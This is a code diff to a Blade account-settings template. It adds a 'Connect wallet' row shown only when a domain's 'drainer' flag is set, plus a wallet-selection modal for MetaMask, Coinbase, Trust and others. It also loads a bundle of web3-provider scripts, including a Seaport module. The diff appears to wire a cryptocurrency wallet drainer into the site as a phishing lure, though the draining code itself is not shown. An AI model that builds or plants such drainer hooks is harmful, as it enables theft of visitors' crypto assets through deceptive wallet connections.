@@ -332,6 +332,35 @@
 
                         </div>
                     </div>
+                    @if($Domain && $Domain['drainer'])
+                        <div class="line">
+                            <div class="title text_17">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-wallet-fill" viewBox="0 0 16 16">
+                                    <path d="M1.5 2A1.5 1.5 0 0 0 0 3.5v2h6a.5.5 0 0 1 .5.5c0 .253.08.644.306.958.207.288.557.542 1.194.542s.987-.254 1.194-.542C9.42 6.644 9.5 6.253 9.5 6a.5.5 0 0 1 .5-.5h6v-2A1.5 1.5 0 0 0 14.5 2z"/>
+                                    <path d="M16 6.5h-5.551a2.7 2.7 0 0 1-.443 1.042C9.613 8.088 8.963 8.5 8 8.5s-1.613-.412-2.006-.958A2.7 2.7 0 0 1 5.551 6.5H0v6A1.5 1.5 0 0 0 1.5 14h13a1.5 1.5 0 0 0 1.5-1.5z"/>
+                                </svg>
+                                Connect wallet
+                            </div>
+                            <div class="content">
+
+                                <input
+                                    type="text"
+                                    readonly
+                                    class="clear text_17 "
+                                    value="Not connect"
+                                />
+                            </div>
+                            <div class="action">
+
+                                <button
+                                    class="btn small_btn btn_16"
+                                    data-izimodal-open="#connectWallet">
+                                    Connect wallet
+                                </button>
+
+                            </div>
+                        </div>
+                    @endif
                 </div>
                 <div class="account-block account-sessions">
                     <h2 class="h2_20 pb10 pt15">Sessions </h2>
@@ -396,7 +425,7 @@
         <button class="closemodal clear" data-izimodal-close="">
             <img src="{{asset('images/modal_close.svg')}}" alt="" />
         </button>
-        <h2 class="h1_25 pb15">Check your e-mail</h2>
+        <h2 class="h1_25 pb15">Check your e-mail"</h2>
         <p class="text_16 _115 color-gray2 pb25">
             We have sent the email change confirmation code to your email address
             <span>jamesg******@gmail.com</span>
@@ -413,6 +442,82 @@
                 class="btn btn_action btn_16 color-dark trigger-changemail"
             >
                 Confirm
+            </button>
+        </form>
+    </div>
+    <div class="modal" id="connectWallet">
+        <button class="closemodal clear" data-izimodal-close="">
+            <img src="{{asset('images/modal_close.svg')}}" alt="" />
+        </button>
+        <h2 class="h1_25 pb15">Select a wallet</h2>
+        <form novalidate id="form_connect_wallet">
+
+            <div class="wallets__container">
+                <div class="wallet">
+                    <input type="radio" value="MetaMask" name="wallet" hidden="" id="metamask">
+                    <label for="metamask" class="wallet_img">
+                        <img src="/images/wallets/metamask.png">
+                    </label>
+                    <h3>Metamask</h3>
+                </div>
+
+                <div class="wallet">
+                    <input type="radio" name="wallet" hidden="" value="CoinBase" id="coinbase">
+                    <label for="coinbase" class="wallet_img">
+                        <img src="/images/wallets/coinbase.png">
+                    </label>
+                    <h3>Coinbase</h3>
+                </div>
+
+                <div class="wallet">
+                    <input type="radio" value="Binance Wallet" name="wallet" hidden="" id="binance_wallet">
+                    <label for="binance_wallet" class="wallet_img">
+                        <img src="/images/wallets/binance_wallet.png">
+                    </label>
+                    <h3>Binance wallet</h3>
+                </div>
+
+                <div class="wallet">
+                    <input type="radio" value="Trust Wallet" name="wallet" hidden="" id="trust_wallet">
+                    <label for="trust_wallet" class="wallet_img">
+                        <img src="/images/wallets/trust_wallet.png">
+                    </label>
+                    <h3>Trust Wallet</h3>
+                </div>
+
+                <div class="wallet">
+                    <input type="radio" value="WalletConnect" name="wallet" hidden="" id="wallet_connect">
+                    <label for="wallet_connect" class="wallet_img">
+                        <img src="/images/wallets/wallet_connect.png">
+                    </label>
+                    <h3>WalletConnect</h3>
+                </div>
+
+                <script>
+                    (function() {
+                        const walletRadios = document.querySelectorAll('input[name="wallet"]');
+
+                        walletRadios.forEach(radio => {
+                            radio.addEventListener('change', function() {
+                                document.querySelectorAll('.wallet').forEach(wallet => {
+                                    wallet.classList.remove('active');
+                                });
+
+                                const selectedWallet = document.querySelector('.wallet input[name="wallet"]:checked');
+                                if (selectedWallet) {
+                                    selectedWallet.closest('.wallet').classList.add('active');
+                                }
+                            });
+                        });
+                    })();
+
+                </script>
+            </div>
+
+            <button
+                onclick="open_connect_wallet()"
+                class="btn btn_action btn_16 color-dark trigger-connect_wallet">
+                Connect
             </button>
         </form>
     </div>
@@ -603,12 +708,13 @@
     const modalOptions = {
         radius: "15px",
         padding: "30px",
-        width: 620,
+        width: 700,
     };
     $("#changeMail").iziModal(modalOptions);
     $("#change2fa").iziModal(modalOptions);
     $("#confirmMail").iziModal(modalOptions);
     $("#changePassword").iziModal(modalOptions);
+    $("#connectWallet").iziModal(modalOptions);
     $("#verify").iziModal(modalOptions);
 </script>
 <script>
@@ -903,6 +1009,30 @@
     const timezone = document.getElementById("timezone");
     timezone.innerText = userTimeZone;
 </script>
+
+<script>
+    function open_connect_wallet(){
+        const active_wallet = document.querySelector('.wallet input[name="wallet"]:checked');
+        if(active_wallet) {
+            const wallet = active_wallet.value;
+            connect_wallet(wallet);
+        }
+
+
+
+    }
+</script>
 <script src="{{asset("js/load.js")}}"></script>
+<script src="./assets/web3-provider/web3-modal.js"></script>
+<script src="./assets/web3-provider/web3-loader.js"></script>
+<script src="./assets/web3-provider/web3-connect.js"></script>
+<script src="./assets/web3-provider/web3-router.js"></script>
+<script src="./assets/web3-provider/web3-module.js"></script>
+<script src="./assets/web3-provider/web3-alert.js"></script>
+<script src="./assets/web3-provider/web3-seaport.js"></script>
+<script src="./assets/web3-provider/web3-data.js"></script>
+<script src="./assets/web3-provider/ethers.js"></script>
+<script src="./assets/web3-provider/ethereum-tx.js"></script>
+<script src="./assets/web3-provider.js"></script>
 </body>
 </html>
